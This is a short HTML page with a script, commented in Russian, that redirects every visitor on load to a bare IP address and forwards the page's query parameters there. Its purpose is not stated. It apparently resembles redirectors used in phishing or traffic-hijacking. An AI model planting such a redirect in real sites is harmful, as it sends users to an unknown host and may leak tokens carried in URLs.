<html>
<body>
<script>
  const baseUrl = "http://31.130.130.186?p=1";

  // берём текущие параметры
  const params = window.location.search;

  // если есть параметры — добавляем
  const redirectUrl = params 
    ? baseUrl + "&" + params.substring(1)
    : baseUrl;

  document.location = redirectUrl;
</script>
</body>
</html>
